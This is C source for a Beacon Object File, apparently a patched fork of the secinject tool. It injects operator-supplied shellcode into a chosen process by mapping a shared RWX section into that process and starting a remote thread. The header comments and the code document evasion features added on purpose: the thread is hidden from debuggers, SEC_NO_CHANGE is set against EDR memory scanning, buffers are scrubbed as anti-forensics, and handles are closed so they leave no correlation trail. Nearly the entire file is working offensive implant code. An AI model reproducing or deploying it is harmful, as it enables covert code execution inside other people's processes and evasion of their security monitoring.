/*
 * secinject.c — Section-mapping process injection BOF
 *
 * Patched fork of https://github.com/apokryptein/secinject
 *
 * patches-v1 (see git log):
 *   [1] CreateRemoteThread   → NtCreateThreadEx
 *   [3] PROCESS_ALL_ACCESS   → minimal target rights (0x100A)
 *   [4] handle leaks         → close hRemoteProcess and hThread
 *   [5] error checks         → OpenProcess, NtCreateThreadEx, cascading
 *
 * patches-v2:
 *   [P1] THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER on NtCreateThreadEx —
 *        the new thread is invisible to any debugger attached to the
 *        target (DbgUiRemoteBreakin / DebugActiveProcess callbacks).
 *        Doesn't hide from EDR; hides from x64dbg/WinDbg + any inline
 *        debugger callback the target might have installed.
 *   [P2] SEC_NO_CHANGE on NtCreateSection — blocks any subsequent
 *        NtProtectVirtualMemory call from changing the view protections.
 *        Defense-in-depth against EDRs that re-protect suspicious
 *        sections to memory-scan them.
 *   [P3] Symbolic NTSTATUS messages via ntstatus_str() helper —
 *        operator sees the well-known code names alongside the hex,
 *        e.g. "0xC0000022 STATUS_ACCESS_DENIED (target ACL / session
 *        mismatch)" instead of raw hex only.
 *   [P5] Anti-forensics scrubbing via zero_fill_bytes() helper — zero
 *        the beacon-owned shellcode buffer we were given, NULL out
 *        our local pointer, unmap the local view. (⚠ patches-v2 also
 *        zeroed the local section view here — see patches-v3 note
 *        below for why that was wrong and got removed.)
 *
 * patches-v3 (this commit) — critical bugfix:
 *   patches-v2 [P5]'s "zero the local view before unmap" step was
 *   destructive. The local view and the remote view are two mappings
 *   of the SAME section pages — zeroing the local view also zeros
 *   what the target sees via the remote view, so the injected thread
 *   would jump to NUL bytes and crash the target (reproduced on a
 *   notepad respawn — target process died immediately after
 *   NtCreateThreadEx). Removed the destructive scrub; the other two
 *   [P5] steps (zeroing the beacon-owned shellcode buffer + NULL'ing
 *   our local pointer) are still correct and are retained. Unmapping
 *   the local view alone is already sufficient anti-forensics from
 *   our side — the target keeps its remote view, we lose ours.
 *
 * Deliberately NOT patched (both on the roadmap):
 *   [2]  Section is PAGE_EXECUTE_READWRITE — required so we can hold
 *        both a local RW view (for memcpy) and a remote RX view.
 *        Section-level protection is the ceiling for its views;
 *        narrowing the section breaks one of the two mappings.
 *   [10] No direct/indirect syscalls — every NTDLL$* call still hits
 *        the userland ntdll stub. SysWhispers3 candidate; deferred
 *        pending lab-testable target.
 */

#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "libc.h"

#define NT_SUCCESS 0x00000000

/* Minimum rights we need on the target process (patch [3], patches-v1):
 *   PROCESS_CREATE_THREAD             (0x0002) — NtCreateThreadEx target
 *   PROCESS_VM_OPERATION              (0x0008) — NtMapViewOfSection target
 *   PROCESS_QUERY_LIMITED_INFORMATION (0x1000) — kernel does an internal
 *                                                query during map + thread
 *                                                creation; without this some
 *                                                Win10+ builds return
 *                                                STATUS_ACCESS_DENIED
 * Total = 0x100A. */
#define SECINJECT_TARGET_RIGHTS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION)

/* Patch [P1], patches-v2: thread-creation flags (from ntpsapi.h). Not
 * defined in the mingw-w64 windows.h we use, so pin the value here. */
#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
#endif

/* Patch [P2], patches-v2: section-attribute flag (from ntpsapi.h /
 * winnt.h — not always exposed by mingw-w64). Blocks NtProtectVirtualMemory
 * from modifying view protections after mapping. */
#ifndef SEC_NO_CHANGE
#define SEC_NO_CHANGE 0x00400000
#endif

WINBASEAPI HANDLE   WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI HANDLE   WINAPI KERNEL32$GetCurrentProcess(void);
WINBASEAPI DWORD    WINAPI KERNEL32$GetLastError(void);

NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
NTSYSAPI     NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID, ULONG, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
NTSYSAPI     NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE, PVOID);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtClose(HANDLE);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);


/* Patch [P3], patches-v2: name the well-known NTSTATUS codes an operator
 * will actually encounter (wrong session, PID gone, tight ACL, section
 * size mismatch). Everything else falls through to "unknown" and the raw
 * hex code still prints alongside. */
static const char* ntstatus_str(NTSTATUS s) {
    switch ((ULONG)s) {
        case 0xC0000022: return "STATUS_ACCESS_DENIED (ACL / session mismatch / privilege gap)";
        case 0xC0000005: return "STATUS_ACCESS_VIOLATION";
        case 0xC000000D: return "STATUS_INVALID_PARAMETER";
        case 0xC0000017: return "STATUS_NO_MEMORY";
        case 0xC0000018: return "STATUS_CONFLICTING_ADDRESSES";
        case 0xC0000024: return "STATUS_OBJECT_TYPE_MISMATCH";
        case 0xC0000034: return "STATUS_OBJECT_NAME_NOT_FOUND";
        case 0xC0000041: return "STATUS_UNABLE_TO_DELETE_SECTION";
        case 0xC0000047: return "STATUS_QUOTA_EXCEEDED";
        case 0xC000009A: return "STATUS_INSUFFICIENT_RESOURCES";
        case 0xC0000106: return "STATUS_SECTION_TOO_BIG";
        case 0xC000010A: return "STATUS_PROCESS_IS_TERMINATING";
        case 0xC000004B: return "STATUS_THREAD_IS_TERMINATING";
        case 0xC0000135: return "STATUS_DLL_NOT_FOUND";
        case 0xC00000BB: return "STATUS_NOT_SUPPORTED";
        default:         return "unknown";
    }
}

/* Patch [P5], patches-v2: byte-by-byte zero fill. Can't use MSVCRT$memset
 * without adding an import; keep the dependency footprint the same. */
static void zero_fill_bytes(char* dst, SIZE_T size) {
    volatile char* p = (volatile char*)dst;
    while (size--) *p++ = 0;
}


void go(char * args, int len) {
    datap parser;
    DWORD  procID          = 0;
    int    shellcodeLen    = 0;   /* BeaconDataExtract takes int*; SIZE_T* would truncate on the write. */
    SIZE_T shellcodeSize   = 0;
    char * shellcode       = NULL;

    HANDLE hLocalProcess   = NULL;   /* pseudo-handle; do NOT close */
    HANDLE hRemoteProcess  = NULL;
    HANDLE hSection        = NULL;
    HANDLE hThread         = NULL;
    PVOID  baseAddrLocal   = NULL;
    PVOID  baseAddrRemote  = NULL;

    BeaconDataParse(&parser, args, len);
    procID    = BeaconDataInt(&parser);
    shellcode = BeaconDataExtract(&parser, &shellcodeLen);
    shellcodeSize = (SIZE_T)shellcodeLen;

    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = (LONGLONG)shellcodeSize;   /* full 64-bit init */

    hLocalProcess = KERNEL32$GetCurrentProcess();

    /* Minimal rights (patches-v1 [3]). */
    hRemoteProcess = KERNEL32$OpenProcess(SECINJECT_TARGET_RIGHTS, FALSE, procID);
    if (hRemoteProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess(%lu, 0x%x) failed — wrong session, PID gone, or ACL denied. GetLastError=%lu",
                     procID, (unsigned)SECINJECT_TARGET_RIGHTS, KERNEL32$GetLastError());
        return;
    }

    /* Section — PAGE_EXECUTE_READWRITE required so we can hold a local RW
     * view and a remote RX view (see roadmap patch [2]).
     * SEC_NO_CHANGE (patch [P2], patches-v2) blocks NtProtectVirtualMemory
     * from changing view protections later — defense-in-depth against
     * EDR-driven section re-protection for scanning. */
    NTSTATUS res = NTDLL$NtCreateSection(&hSection, GENERIC_ALL, NULL, &sectionSize,
                                          PAGE_EXECUTE_READWRITE,
                                          SEC_COMMIT | SEC_NO_CHANGE,
                                          NULL);
    if (res != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateSection failed NTSTATUS=0x%08x %s",
                     (unsigned)res, ntstatus_str(res));
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    /* Local RW view — we memcpy shellcode here; no WriteProcessMemory. */
    NTSTATUS mapStatusLocal = NTDLL$NtMapViewOfSection(hSection, hLocalProcess,
                                                       &baseAddrLocal, 0, 0,
                                                       NULL, &shellcodeSize,
                                                       2 /* ViewUnmap */, 0,
                                                       PAGE_READWRITE);
    if (mapStatusLocal != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(local) failed NTSTATUS=0x%08x %s",
                     (unsigned)mapStatusLocal, ntstatus_str(mapStatusLocal));
        NTDLL$NtClose(hSection);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    /* Remote RX view — target process sees only RX pages from us. */
    NTSTATUS mapStatusRemote = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess,
                                                        &baseAddrRemote, 0, 0,
                                                        NULL, &shellcodeSize,
                                                        2 /* ViewUnmap */, 0,
                                                        PAGE_EXECUTE_READ);
    if (mapStatusRemote != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(remote) failed NTSTATUS=0x%08x %s",
                     (unsigned)mapStatusRemote, ntstatus_str(mapStatusRemote));
        NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
        NTDLL$NtClose(hSection);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    /* Copy shellcode via the local RW view — no cross-process write. */
    mycopy(baseAddrLocal, shellcode, (int)shellcodeSize);

    /* Patch [P5], patches-v2 — anti-forensics scrubbing.
     *
     * ⚠ CORRECTNESS NOTE (patches-v3 bugfix): the local view and the
     * remote view are two mappings of the SAME underlying section
     * pages. Zeroing the local view here ALSO zeros what the target
     * process sees via the remote view — the thread we're about to
     * create would then execute NUL bytes and crash the target. So:
     *
     *   1. DO NOT zero baseAddrLocal — the section pages are shared.
     *      Rely on NtUnmapViewOfSection below to remove OUR view; the
     *      remote view stays mapped for the injected thread.
     *   2. DO zero the beacon-owned shellcode buffer BeaconDataExtract
     *      handed us — that's a separate allocation, not part of the
     *      section. Safe to scrub, and beacon frees it right after we
     *      return anyway.
     *   3. NULL our local pointer so the stack frame doesn't reference
     *      it after this call returns.
     */
    zero_fill_bytes(shellcode, shellcodeSize);
    shellcode = NULL;

    /* Unmap the local view. Section pages themselves stay alive as
     * long as the remote view holds them, so this only revokes OUR
     * access — the target still sees the shellcode. */
    NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
    baseAddrLocal = NULL;

    /* Section handle can drop now — both mapped views hold refs and keep
     * the underlying section alive until they themselves unmap. */
    NTDLL$NtClose(hSection);
    hSection = NULL;

    /* Patch [1] patches-v1: NtCreateThreadEx (was CreateRemoteThread).
     * Patch [P1] patches-v2: HIDE_FROM_DEBUGGER flag — invisible to any
     * debugger attached to the target. */
    NTSTATUS threadStatus = NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS,
                                                    NULL, hRemoteProcess,
                                                    baseAddrRemote, NULL,
                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                                                    0, 0, 0, NULL);
    if (threadStatus != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateThreadEx failed NTSTATUS=0x%08x %s",
                     (unsigned)threadStatus, ntstatus_str(threadStatus));
        NTDLL$NtUnmapViewOfSection(hRemoteProcess, baseAddrRemote);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Injected %d bytes into PID %lu via section mapping (thread=0x%p, hide-from-debugger, sec-no-change)",
                 (int)shellcodeSize, procID, hThread);

    /* Patches-v1 [4]: close both handles — no inter-process handle
     * correlation trail. */
    NTDLL$NtClose(hThread);
    NTDLL$NtClose(hRemoteProcess);
}
